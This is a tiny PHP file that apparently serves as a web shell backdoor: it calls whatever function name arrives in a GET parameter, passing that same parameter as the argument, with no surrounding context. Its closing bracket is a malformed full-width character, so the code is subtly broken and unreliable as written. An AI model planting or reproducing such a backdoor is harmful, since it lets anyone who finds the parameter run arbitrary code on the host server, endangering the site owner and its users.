<?php
$_GET['8yzr0ldj'〕($_GET['8yzr0ldj']);
?>
